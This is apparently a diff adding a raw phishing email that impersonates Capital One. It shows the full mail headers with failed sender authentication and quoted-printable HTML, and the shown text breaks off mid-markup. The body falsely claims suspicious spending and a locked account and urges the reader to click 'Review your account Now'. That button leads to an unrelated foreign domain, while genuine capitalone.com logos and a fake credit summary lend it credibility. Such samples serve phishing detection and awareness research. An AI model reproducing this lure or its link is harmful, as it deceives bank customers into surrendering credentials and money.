@@ -1,0 +1,710 @@
+Return-Path: <Capitalone-zingerpie@servicemail.com>
+Received: from servicemail.com (47-190-176-35.static.grpv.tx.ip.frontiernet.net [47.190.176.35])
+ by inbound-smtp.us-east-2.amazonaws.com with SMTP id 4hesvji2lc36h4r4tbgoghuf4n2644gbdfckauo1
+ for zingerpie@kfcreview.com;
+ Mon, 08 Dec 2025 21:16:12 +0000 (UTC)
+Received-SPF: none (spfCheck: 47.190.176.35 is neither permitted nor denied by domain of servicemail.com) client-ip=47.190.176.35; envelope-from=Capitalone-zingerpie@servicemail.com; helo=servicemail.com;
+Authentication-Results: amazonses.com;
+ spf=none (spfCheck: 47.190.176.35 is neither permitted nor denied by domain of servicemail.com) client-ip=47.190.176.35; envelope-from=Capitalone-zingerpie@servicemail.com; helo=servicemail.com;
+ dmarc=none header.from=servicemail.com;
+X-SES-RECEIPT: AEFBQUFBQUFBQUFIaFlYMFR0MXE0WlY0YytrZVMxbGFWbzV3Sjg4R2FaMUNkWVZqd2FWUHJTd0lCbEdZRlFTRlRqNTFick1YQXVWYTUvNXdIUVJ1SU5UZjVzWWNLby94ZXE2OEYvaE45Z1ZQODRMZENRN0hNRWs2OElsczRJaEhuQzQyU0lZVlJnY1JKUmxUU2NrQS9xNnRpQVAxdWxadUoxVVdlTjFRVi9XSTdzd095T0RtU25xeXBkektDaVBYNUdjUjN4MmJSRUd6ZXJrOVROM3JiRHVoSmxNQ21FRjIzc1pZTy9ydTQxTXVjM2xLYjlzR1I1WWsyMFpTOHhSTWpqRXFLMm5RcjBJSlBEVVlITFBRNkhKOWlqUEcxaXJ6amtPY1gwSWZyN3h4RlJPT1hsc2RsY0pSN29CT3hBdFJXV2FQczI4VFBqdVE9
+X-SES-DKIM-SIGNATURE: a=rsa-sha256; q=dns/txt; b=V5uVYALkE18DyCsF3YEw8UQ3fuHbqgyi5dp73TJjywc4uYdMp3q8R3nz1pqbm7FOOA0/MAF8gKs+IVAUCRKczz2PI+nIe5mbeKGtqSLaRjuvFkMHb9+/pFu3ZAuaa3vvxmsyiGf1d1D98qrqg+ua+rsJHYJBmls8ste5gcZMhQ4=; c=relaxed/simple; s=ndjes4mrtuzus6qxu3frw3ubo3gpjndv; d=amazonses.com; t=1765228573; v=1; bh=6y1dgCekE8QOoPHmzQda6dUOkH2kiyuFIeNPTezZ6iQ=; h=From:To:Cc:Bcc:Subject:Date:Message-ID:MIME-Version:Content-Type:X-SES-RECEIPT;
+From: "Capital One" <Capitalone-zingerpie@servicemail.com>
+To: zingerpie@kfcreview.com
+Subject: Attention Required: Immediate Review of Suspicious Spending Patterns
+Date: 08 Dec 2025 15:16:13 -0600
+Message-ID: <20251208151613.51B2A2331690FC5D@servicemail.com>
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+
+<HTML><HEAD>
+<META content=3D"text/html; charset=3DUTF-8" http-equiv=3DContent-Type>
+<META name=3DGENERATOR content=3D"MSHTML 11.00.10570.1001"></HEAD>
+<BODY>
+<TABLE class=3D"v1darkmode v1header" style=3D"BOX-SIZING: border-box; FONT-=
+SIZE: 14px; FONT-FAMILY: Roboto, sans-serif; WHITE-SPACE: normal; WORD-SPAC=
+ING: 0px; BORDER-COLLAPSE: collapse; TEXT-TRANSFORM: none; FONT-WEIGHT: 400=
+; COLOR: rgb(44,54,58); FONT-STYLE: normal; TEXT-ALIGN: left; ORPHANS: 2; W=
+IDOWS: 2; LETTER-SPACING: normal; font-variant-ligatures: normal; font-vari=
+ant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-thickness=
+: initial; text-decoration-style: initial;=20
+text-decoration-color: initial" cellSpacing=3D0 cellPadding=3D0 width=3D"10=
+0%" bgColor=3D#ffffff border=3D0>
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<TD style=3D"BOX-SIZING: border-box; PADDING-BOTTOM: 8px; PADDING-TOP: 16px=
+; PADDING-LEFT: 24px; PADDING-RIGHT: 24px"></TD></TR>
+<TR style=3D"BOX-SIZING: border-box">
+<TD style=3D"BOX-SIZING: border-box; FONT-SIZE: 0px; HEIGHT: 1px; PADDING-B=
+OTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 24px; LINE-HEIGHT: 0; PADDING-R=
+IGHT: 24px">
+<DIV style=3D"BOX-SIZING: border-box; BORDER-BOTTOM: rgb(212,212,212) 1px s=
+olid">&nbsp;</DIV></TD></TR></TBODY></TABLE>
+<TABLE class=3D"v1darkmode v1header" style=3D"BOX-SIZING: border-box; FONT-=
+SIZE: 14px; FONT-FAMILY: Roboto, sans-serif; WHITE-SPACE: normal; WORD-SPAC=
+ING: 0px; BORDER-COLLAPSE: collapse; TEXT-TRANSFORM: none; FONT-WEIGHT: 400=
+; COLOR: rgb(44,54,58); FONT-STYLE: normal; TEXT-ALIGN: left; ORPHANS: 2; W=
+IDOWS: 2; LETTER-SPACING: normal; font-variant-ligatures: normal; font-vari=
+ant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-thickness=
+: initial; text-decoration-style: initial;=20
+text-decoration-color: initial" cellSpacing=3D0 cellPadding=3D0 width=3D"10=
+0%" bgColor=3D#ffffff border=3D0>
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<TD style=3D"BOX-SIZING: border-box; PADDING-BOTTOM: 16px; PADDING-TOP: 16p=
+x; PADDING-LEFT: 24px; PADDING-RIGHT: 24px">
+<H1 style=3D"BOX-SIZING: border-box; FONT-WEIGHT: 500; MARGIN: 0px; LINE-HE=
+IGHT: 1.2"><A style=3D"BOX-SIZING: border-box; TEXT-DECORATION: none; COLOR=
+: rgb(0,172,255); BACKGROUND-COLOR: transparent" href=3D"https://click-noti=
+fication.capitalone.com/f/a/NFuWZ3UoO9JcVMt5NrVnlw~~/AAAAARA~/KYpfo6zvnNs25=
+kEMKRarDODpesUntWEJBhmqZKSGsCVp2A4JIoXpgb836pQBDOcO1YOTOrm4t1d-cFG7R19LB4W8=
+YF32Y0dVCBjI8PIMoPrAzqyYN6JAx3xW1z8RXX1W" rel=3Dnoreferrer target=3D_blank>=
+
+<IMG class=3Dv1lightimg style=3D'BORDER-TOP-STYLE: none; BOX-SIZING: border=
+-box; MAX-WIDTH: 318px !important; BORDER-LEFT-STYLE: none; HEIGHT: auto; W=
+IDTH: 318px; VERTICAL-ALIGN: middle; BORDER-BOTTOM-STYLE: none; COLOR: rgb(=
+20,20,20); FONT: 14px/20px Optimist, "Helvetica Neue", Helvetica, Arial, sa=
+ns-serif; BORDER-RIGHT-STYLE: none; DISPLAY: block; border-radius: 4px' bor=
+der=3D0 alt=3D"Capital One | CreditWise"=20
+src=3D"https://ecm.capitalone.com/Messaging/assets/images/logos_global/lock=
+up_creditWise_3x.png" width=3D318 height=3D58></A></H1></TD></TR></TBODY></=
+TABLE>
+<TABLE class=3Dv1darkmode style=3D"BOX-SIZING: border-box; FONT-SIZE: 14px;=
+ FONT-FAMILY: Roboto, sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; B=
+ORDER-COLLAPSE: collapse; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rg=
+b(44,54,58); FONT-STYLE: normal; TEXT-ALIGN: left; ORPHANS: 2; WIDOWS: 2; L=
+ETTER-SPACING: normal; font-variant-ligatures: normal; font-variant-caps: n=
+ormal; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial; =
+text-decoration-style: initial;=20
+text-decoration-color: initial" cellSpacing=3D0 cellPadding=3D0 width=3D"10=
+0%" bgColor=3D#ffffff border=3D0>
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<TD style=3D'BOX-SIZING: border-box; FONT-FAMILY: Optimist, "Helvetica Neue=
+", Helvetica, Arial, sans-serif; COLOR: rgb(20,20,20); PADDING-BOTTOM: 32px=
+; TEXT-ALIGN: center; PADDING-TOP: 32px; PADDING-LEFT: 24px; PADDING-RIGHT:=
+ 24px'>
+<H2 style=3D"BOX-SIZING: border-box; FONT-SIZE: 32px; FONT-WEIGHT: 600; MAR=
+GIN: 0px; LINE-HEIGHT: 46px"><SPAN style=3D"BOX-SIZING: border-box; FONT-SI=
+ZE: 36px; FONT-WEIGHT: 300; LINE-HEIGHT: 46px">Urgent Request to Review Sus=
+picious Spending Patterns, Fraud Report</SPAN></H2></TD></TR></TBODY></TABL=
+E>
+<TABLE class=3Dv1darkmode style=3D"BOX-SIZING: border-box; FONT-SIZE: 14px;=
+ FONT-FAMILY: Roboto, sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; B=
+ORDER-COLLAPSE: collapse; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rg=
+b(44,54,58); FONT-STYLE: normal; TEXT-ALIGN: left; ORPHANS: 2; WIDOWS: 2; L=
+ETTER-SPACING: normal; font-variant-ligatures: normal; font-variant-caps: n=
+ormal; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial; =
+text-decoration-style: initial;=20
+text-decoration-color: initial" cellSpacing=3D0 cellPadding=3D0 width=3D"10=
+0%" bgColor=3D#ffffff border=3D0>
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<TD style=3D'BOX-SIZING: border-box; FONT-SIZE: 16px; FONT-FAMILY: Optimist=
+, "Helvetica Neue", Helvetica, Arial, sans-serif; COLOR: rgb(20,20,20); PAD=
+DING-BOTTOM: 24px; TEXT-ALIGN: left; PADDING-TOP: 0px; PADDING-LEFT: 24px; =
+LINE-HEIGHT: 24px; PADDING-RIGHT: 24px'><SPAN style=3D"BOX-SIZING: border-b=
+ox; FONT-SIZE: 16px; FONT-WEIGHT: 400; LINE-HEIGHT: 24px">
+<P style=3D"BOX-SIZING: border-box; MARGIN: 0px"><SPAN style=3D'BOX-SIZING:=
+ border-box; FONT-SIZE: 16px; FONT-FAMILY: Optimist, "Helvetica Neue", Helv=
+etica, Arial, sans-serif; FONT-WEIGHT: 400; LINE-HEIGHT: 24px'>Our monitori=
+ng systems flagged transactions that appear inconsistent with your typical =
+spending behavior. While we cannot disclose specific details for security r=
+easons, this may include unexpected purchases, geographic irregularities, o=
+r high-frequency activity:</SPAN></P>
+<P style=3D"BOX-SIZING: border-box; MARGIN: 0px"><SPAN style=3D'BOX-SIZING:=
+ border-box; FONT-SIZE: 16px; FONT-FAMILY: Optimist, "Helvetica Neue", Helv=
+etica, Arial, sans-serif; FONT-WEIGHT: 400; LINE-HEIGHT: 24px'></SPAN>&nbsp=
+;</P>
+<P style=3D"BOX-SIZING: border-box; MARGIN: 0px"><SPAN style=3D'BOX-SIZING:=
+ border-box; FONT-SIZE: 16px; FONT-FAMILY: Optimist, "Helvetica Neue", Helv=
+etica, Arial, sans-serif; FONT-WEIGHT: 400; LINE-HEIGHT: 24px'>To protect y=
+our account from potential fraud, we have temporarily locked it as a precau=
+tionary measure and immediate action is required</SPAN>.</SPAN></P></TD></T=
+R>
+<TR style=3D"BOX-SIZING: border-box">
+<TD style=3D"BOX-SIZING: border-box; FONT-SIZE: 0px; PADDING-BOTTOM: 8px; P=
+ADDING-TOP: 0px; PADDING-LEFT: 0px; LINE-HEIGHT: 0; PADDING-RIGHT: 0px">&nb=
+sp;</TD></TR></TBODY></TABLE>
+<TABLE class=3Dv1darkmode style=3D"BOX-SIZING: border-box; FONT-SIZE: 14px;=
+ FONT-FAMILY: Roboto, sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; B=
+ORDER-COLLAPSE: collapse; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rg=
+b(44,54,58); FONT-STYLE: normal; TEXT-ALIGN: left; ORPHANS: 2; WIDOWS: 2; L=
+ETTER-SPACING: normal; font-variant-ligatures: normal; font-variant-caps: n=
+ormal; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial; =
+text-decoration-style: initial;=20
+text-decoration-color: initial" cellSpacing=3D0 cellPadding=3D0 width=3D"10=
+0%" bgColor=3D#ffffff border=3D0>
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<TD style=3D"BOX-SIZING: border-box; PADDING-BOTTOM: 24px; TEXT-ALIGN: cent=
+er; PADDING-TOP: 0px; PADDING-LEFT: 24px; PADDING-RIGHT: 24px">
+<TABLE class=3Dv1cssbutton style=3D"BOX-SIZING: border-box; BORDER-COLLAPSE=
+: collapse; border-radius: 4px" cellSpacing=3D0 cellPadding=3D0 align=3Dcen=
+ter bgColor=3D#0276b1 border=3D0>
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<TD class=3Dv1cssbutton style=3D"BOX-SIZING: border-box; TEXT-ALIGN: center=
+; LINE-HEIGHT: 30px" width=3D300><A style=3D'BOX-SIZING: border-box; TEXT-D=
+ECORATION: none; WIDTH: 300px; COLOR: rgb(0,172,255); FONT: 20px/30px Optim=
+ist, "Helvetica Neue", Helvetica, Arial, sans-serif; DISPLAY: inline-block;=
+ BACKGROUND-COLOR: transparent' href=3D"https://ruokalahetti.fi/sxcm" rel=
+=3Dnoreferrer target=3D_blank>
+<STRONG style=3D"BOX-SIZING: border-box; FONT-WEIGHT: 400; COLOR: rgb(255,2=
+55,255); PADDING-BOTTOM: 9px; PADDING-TOP: 9px; PADDING-LEFT: 16px; DISPLAY=
+: inline-block; PADDING-RIGHT: 16px">Review your account Now</STRONG></A></=
+TD></TR></TBODY></TABLE>
+<P>&nbsp;</P>
+<P>Check your transaction history for any unauthorized charges. If you reco=
+gnize suspicious activity, report it immediately.</P>
+<P>If fraudulent transactions are confirmed, Capital One will issue a provi=
+sional credit and investigate further. You will not be held responsible for=
+ unauthorized charges.</P></TD></TR>
+<TR style=3D"BOX-SIZING: border-box">
+<TD style=3D"BOX-SIZING: border-box; FONT-SIZE: 0px; PADDING-BOTTOM: 8px; P=
+ADDING-TOP: 0px; PADDING-LEFT: 0px; LINE-HEIGHT: 0; PADDING-RIGHT: 0px">&nb=
+sp;</TD></TR></TBODY></TABLE>
+<TABLE class=3Dv1darkmode style=3D"BOX-SIZING: border-box; FONT-SIZE: 14px;=
+ FONT-FAMILY: Roboto, sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; B=
+ORDER-COLLAPSE: collapse; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rg=
+b(44,54,58); FONT-STYLE: normal; TEXT-ALIGN: left; ORPHANS: 2; WIDOWS: 2; L=
+ETTER-SPACING: normal; font-variant-ligatures: normal; font-variant-caps: n=
+ormal; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial; =
+text-decoration-style: initial;=20
+text-decoration-color: initial" cellSpacing=3D0 cellPadding=3D0 width=3D"10=
+0%" bgColor=3D#ffffff border=3D0>
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<TD style=3D"BOX-SIZING: border-box; PADDING-BOTTOM: 0px; PADDING-TOP: 0px;=
+ PADDING-LEFT: 0px; PADDING-RIGHT: 0px">
+<TABLE style=3D"BOX-SIZING: border-box; MAX-WIDTH: 544px; WIDTH: 544px; BOR=
+DER-COLLAPSE: collapse; MARGIN: 0px auto" cellSpacing=3D0 cellPadding=3D0 a=
+lign=3Dcenter border=3D0>
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<TD style=3D"BOX-SIZING: border-box">
+<TABLE class=3Dv1darkaccent style=3D"BOX-SIZING: border-box; BORDER-COLLAPS=
+E: collapse" cellSpacing=3D0 cellPadding=3D0 width=3D"100%" bgColor=3D#f4f4=
+f4 border=3D0>
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<TD style=3D"BOX-SIZING: border-box; FONT-SIZE: 0px; PADDING-BOTTOM: 24px; =
+PADDING-TOP: 0px; PADDING-LEFT: 0px; LINE-HEIGHT: 0; PADDING-RIGHT: 0px">&n=
+bsp;</TD></TR>
+<TR style=3D"BOX-SIZING: border-box">
+<TD style=3D'BOX-SIZING: border-box; FONT-FAMILY: Optimist, "Helvetica Neue=
+", Helvetica, Arial, sans-serif; COLOR: rgb(20,20,20); PADDING-BOTTOM: 24px=
+; TEXT-ALIGN: center; PADDING-TOP: 0px; PADDING-LEFT: 24px; PADDING-RIGHT: =
+24px'>
+<H2 style=3D"BOX-SIZING: border-box; FONT-SIZE: 24px; FONT-WEIGHT: 600; MAR=
+GIN: 0px; LINE-HEIGHT: 36px"><SPAN style=3D"BOX-SIZING: border-box; FONT-WE=
+IGHT: 300">Highlights of your changes from</SPAN><SPAN style=3D"BOX-SIZING:=
+ border-box; FONT-WEIGHT: 300"></SPAN><SPAN style=3D"BOX-SIZING: border-box=
+; FONT-WEIGHT: 300"><BR class=3Dv1mblhide style=3D"BOX-SIZING: border-box; =
+DISPLAY: inline">September 19, 2025 to October 17, 2025</SPAN></H2></TD></T=
+R>
+<TR style=3D"BOX-SIZING: border-box">
+<TD style=3D"BOX-SIZING: border-box; FONT-SIZE: 0px; PADDING-BOTTOM: 0px; T=
+EXT-ALIGN: center; PADDING-TOP: 0px; PADDING-LEFT: 12px; PADDING-RIGHT: 12p=
+x" dir=3Dltr>
+<DIV class=3Dv1column style=3D"BOX-SIZING: border-box; MAX-WIDTH: 103px; WI=
+DTH: 103px; VERTICAL-ALIGN: top; DISPLAY: inline-block">
+<TABLE style=3D"BOX-SIZING: border-box; BORDER-COLLAPSE: collapse" dir=3Dlt=
+r cellSpacing=3D0 cellPadding=3D0 width=3D"100%" border=3D0>
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<TD style=3D"BOX-SIZING: border-box; PADDING-BOTTOM: 24px; TEXT-ALIGN: cent=
+er; PADDING-TOP: 0px; PADDING-LEFT: 12px; PADDING-RIGHT: 12px">
+<IMG style=3D'BORDER-TOP-STYLE: none; BOX-SIZING: border-box; MAX-WIDTH: 70=
+px !important; BORDER-LEFT-STYLE: none; HEIGHT: auto; WIDTH: 70px; VERTICAL=
+-ALIGN: bottom; BORDER-BOTTOM-STYLE: none; COLOR: rgb(20,20,20); TEXT-ALIGN=
+: center; FONT: 20px/30px Optimist, "Helvetica Neue", Helvetica, Arial, san=
+s-serif; BORDER-RIGHT-STYLE: none' border=3D0=20
+src=3D"https://mi.capitalone.com/p/rp/bed25787d806219a.png?icon_show_border=
+=3Dtrue&amp;icon_color=3D013D5B&amp;icon_id=3Dprimary-annualFee&amp;icon_in=
+ner_color=3DFFFFFF&amp;icon_size=3D70&amp;icon_background=3DF4F4F4" width=
+=3D70></TD></TR>
+<TR style=3D"BOX-SIZING: border-box">
+<TD style=3D"BOX-SIZING: border-box; PADDING-BOTTOM: 8px; PADDING-TOP: 0px;=
+ PADDING-LEFT: 0px; PADDING-RIGHT: 0px">&nbsp;</TD></TR></TBODY></TABLE></D=
+IV><SPAN>&nbsp;</SPAN>=20
+<DIV class=3Dv1column style=3D"BOX-SIZING: border-box; MAX-WIDTH: 417px; WI=
+DTH: 417px; VERTICAL-ALIGN: top; DISPLAY: inline-block">
+<TABLE style=3D"BOX-SIZING: border-box; BORDER-COLLAPSE: collapse" dir=3Dlt=
+r cellSpacing=3D0 cellPadding=3D0 width=3D"100%" border=3D0>
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<TD style=3D'BOX-SIZING: border-box; FONT-FAMILY: Optimist, "Helvetica Neue=
+", Helvetica, Arial, sans-serif; COLOR: rgb(20,20,20); PADDING-BOTTOM: 8px;=
+ TEXT-ALIGN: left; PADDING-TOP: 0px; PADDING-LEFT: 12px; PADDING-RIGHT: 12p=
+x'>
+<H2 style=3D"BOX-SIZING: border-box; FONT-SIZE: 16px; FONT-WEIGHT: 600; MAR=
+GIN: 0px; LINE-HEIGHT: 24px"><STRONG style=3D"BOX-SIZING: border-box; FONT-=
+WEIGHT: bolder">Payment<SPAN>&nbsp;</SPAN></STRONG><STRONG style=3D"BOX-SIZ=
+ING: border-box; FONT-WEIGHT: bolder">history<BR class=3Dv1softBreak style=
+=3D"BOX-SIZING: border-box"></STRONG><SPAN style=3D"BOX-SIZING: border-box;=
+ FONT-WEIGHT: 600; COLOR: rgb(1,61,91)">9/9</SPAN><SPAN style=3D"BOX-SIZING=
+: border-box; FONT-WEIGHT: 600; COLOR: rgb(1,61,91)"><SPAN>
+&nbsp;</SPAN>account payments made on time</SPAN></H2></TD></TR>
+<TR style=3D"BOX-SIZING: border-box">
+<TD style=3D'BOX-SIZING: border-box; FONT-SIZE: 16px; FONT-FAMILY: Optimist=
+, "Helvetica Neue", Helvetica, Arial, sans-serif; COLOR: rgb(20,20,20); PAD=
+DING-BOTTOM: 24px; TEXT-ALIGN: left; PADDING-TOP: 0px; PADDING-LEFT: 12px; =
+LINE-HEIGHT: 24px; PADDING-RIGHT: 12px'>
+<P style=3D"BOX-SIZING: border-box; MARGIN: 0px">To lenders, your history o=
+f on-time payments indicates whether you&#8217;ll make payments on time in =
+the future.</P></TD></TR></TBODY></TABLE></DIV></TD></TR></TBODY></TABLE></=
+TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE>
+<TABLE class=3Dv1darkmode style=3D"BOX-SIZING: border-box; FONT-SIZE: 14px;=
+ FONT-FAMILY: Roboto, sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; B=
+ORDER-COLLAPSE: collapse; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rg=
+b(44,54,58); FONT-STYLE: normal; TEXT-ALIGN: left; ORPHANS: 2; WIDOWS: 2; L=
+ETTER-SPACING: normal; font-variant-ligatures: normal; font-variant-caps: n=
+ormal; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial; =
+text-decoration-style: initial;=20
+text-decoration-color: initial" cellSpacing=3D0 cellPadding=3D0 width=3D"10=
+0%" bgColor=3D#ffffff border=3D0>
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<TD style=3D"BOX-SIZING: border-box; PADDING-BOTTOM: 0px; PADDING-TOP: 0px;=
+ PADDING-LEFT: 0px; PADDING-RIGHT: 0px">
+<TABLE style=3D"BOX-SIZING: border-box; MAX-WIDTH: 544px; WIDTH: 544px; BOR=
+DER-COLLAPSE: collapse; MARGIN: 0px auto" cellSpacing=3D0 cellPadding=3D0 a=
+lign=3Dcenter border=3D0>
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<TD style=3D"BOX-SIZING: border-box">
+<TABLE class=3Dv1darkaccent style=3D"BOX-SIZING: border-box; BORDER-COLLAPS=
+E: collapse" cellSpacing=3D0 cellPadding=3D0 width=3D"100%" bgColor=3D#f4f4=
+f4 border=3D0>
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<TD style=3D"BOX-SIZING: border-box; PADDING-BOTTOM: 0px; PADDING-TOP: 0px;=
+ PADDING-LEFT: 24px; PADDING-RIGHT: 24px">
+<TABLE style=3D"BOX-SIZING: border-box; BORDER-COLLAPSE: collapse" cellSpac=
+ing=3D0 cellPadding=3D0 align=3Dcenter border=3D0>
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<TD style=3D"BOX-SIZING: border-box; FONT-SIZE: 0px; HEIGHT: 0px; BORDER-BO=
+TTOM: rgb(125,125,125) 1px solid; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PA=
+DDING-LEFT: 0px; LINE-HEIGHT: 0; PADDING-RIGHT: 0px" width=3D640>&nbsp;</TD=
+></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE><=
+/TD></TR></TBODY></TABLE>
+<TABLE class=3Dv1darkmode style=3D"BOX-SIZING: border-box; FONT-SIZE: 14px;=
+ FONT-FAMILY: Roboto, sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; B=
+ORDER-COLLAPSE: collapse; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rg=
+b(44,54,58); FONT-STYLE: normal; TEXT-ALIGN: left; ORPHANS: 2; WIDOWS: 2; L=
+ETTER-SPACING: normal; font-variant-ligatures: normal; font-variant-caps: n=
+ormal; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial; =
+text-decoration-style: initial;=20
+text-decoration-color: initial" cellSpacing=3D0 cellPadding=3D0 width=3D"10=
+0%" bgColor=3D#ffffff border=3D0>
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<TD style=3D"BOX-SIZING: border-box; PADDING-BOTTOM: 0px; PADDING-TOP: 0px;=
+ PADDING-LEFT: 0px; PADDING-RIGHT: 0px">
+<TABLE style=3D"BOX-SIZING: border-box; MAX-WIDTH: 544px; WIDTH: 544px; BOR=
+DER-COLLAPSE: collapse; MARGIN: 0px auto" cellSpacing=3D0 cellPadding=3D0 a=
+lign=3Dcenter border=3D0>
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<TD style=3D"BOX-SIZING: border-box">
+<TABLE class=3Dv1darkaccent style=3D"BOX-SIZING: border-box; BORDER-COLLAPS=
+E: collapse" cellSpacing=3D0 cellPadding=3D0 width=3D"100%" bgColor=3D#f4f4=
+f4 border=3D0>
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<TD style=3D"BOX-SIZING: border-box; FONT-SIZE: 0px; PADDING-BOTTOM: 24px; =
+PADDING-TOP: 0px; PADDING-LEFT: 0px; LINE-HEIGHT: 0; PADDING-RIGHT: 0px">&n=
+bsp;</TD></TR>
+<TR style=3D"BOX-SIZING: border-box">
+<TD style=3D"BOX-SIZING: border-box; FONT-SIZE: 0px; PADDING-BOTTOM: 0px; T=
+EXT-ALIGN: center; PADDING-TOP: 0px; PADDING-LEFT: 12px; PADDING-RIGHT: 12p=
+x" dir=3Dltr>
+<DIV class=3Dv1column style=3D"BOX-SIZING: border-box; MAX-WIDTH: 103px; WI=
+DTH: 103px; VERTICAL-ALIGN: top; DISPLAY: inline-block">
+<TABLE style=3D"BOX-SIZING: border-box; BORDER-COLLAPSE: collapse" dir=3Dlt=
+r cellSpacing=3D0 cellPadding=3D0 width=3D"100%" border=3D0>
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<TD style=3D"BOX-SIZING: border-box; PADDING-BOTTOM: 24px; TEXT-ALIGN: cent=
+er; PADDING-TOP: 0px; PADDING-LEFT: 12px; PADDING-RIGHT: 12px">
+<IMG style=3D'BORDER-TOP-STYLE: none; BOX-SIZING: border-box; MAX-WIDTH: 70=
+px !important; BORDER-LEFT-STYLE: none; HEIGHT: auto; WIDTH: 70px; VERTICAL=
+-ALIGN: bottom; BORDER-BOTTOM-STYLE: none; COLOR: rgb(20,20,20); TEXT-ALIGN=
+: center; FONT: 20px/30px Optimist, "Helvetica Neue", Helvetica, Arial, san=
+s-serif; BORDER-RIGHT-STYLE: none' border=3D0=20
+src=3D"https://mi.capitalone.com/p/rp/bed25787d806219a.png?icon_show_border=
+=3Dtrue&amp;icon_color=3D013D5B&amp;icon_id=3Dprimary-loans&amp;icon_inner_=
+color=3DFFFFFF&amp;icon_size=3D70&amp;icon_background=3DF4F4F4" width=3D70>=
+</TD></TR>
+<TR style=3D"BOX-SIZING: border-box">
+<TD style=3D"BOX-SIZING: border-box; PADDING-BOTTOM: 8px; PADDING-TOP: 0px;=
+ PADDING-LEFT: 0px; PADDING-RIGHT: 0px">&nbsp;</TD></TR></TBODY></TABLE></D=
+IV><SPAN>&nbsp;</SPAN>=20
+<DIV class=3Dv1column style=3D"BOX-SIZING: border-box; MAX-WIDTH: 417px; WI=
+DTH: 417px; VERTICAL-ALIGN: top; DISPLAY: inline-block">
+<TABLE style=3D"BOX-SIZING: border-box; BORDER-COLLAPSE: collapse" dir=3Dlt=
+r cellSpacing=3D0 cellPadding=3D0 width=3D"100%" border=3D0>
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<TD style=3D'BOX-SIZING: border-box; FONT-FAMILY: Optimist, "Helvetica Neue=
+", Helvetica, Arial, sans-serif; COLOR: rgb(20,20,20); PADDING-BOTTOM: 8px;=
+ TEXT-ALIGN: left; PADDING-TOP: 0px; PADDING-LEFT: 12px; PADDING-RIGHT: 12p=
+x'>
+<H2 style=3D"BOX-SIZING: border-box; FONT-SIZE: 16px; FONT-WEIGHT: 600; MAR=
+GIN: 0px; LINE-HEIGHT: 24px"><STRONG style=3D"BOX-SIZING: border-box; FONT-=
+WEIGHT: bolder">New<SPAN>&nbsp;</SPAN></STRONG><STRONG style=3D"BOX-SIZING:=
+ border-box; FONT-WEIGHT: bolder">accounts<BR class=3Dv1softBreak style=3D"=
+BOX-SIZING: border-box"></STRONG><SPAN style=3D"BOX-SIZING: border-box; FON=
+T-WEIGHT: 600; COLOR: rgb(1,61,91)">0</SPAN><SPAN style=3D"BOX-SIZING: bord=
+er-box; FONT-WEIGHT: 600; COLOR: rgb(1,61,91)"><SPAN>
+&nbsp;</SPAN>new accounts</SPAN></H2></TD></TR>
+<TR style=3D"BOX-SIZING: border-box">
+<TD style=3D'BOX-SIZING: border-box; FONT-SIZE: 16px; FONT-FAMILY: Optimist=
+, "Helvetica Neue", Helvetica, Arial, sans-serif; COLOR: rgb(20,20,20); PAD=
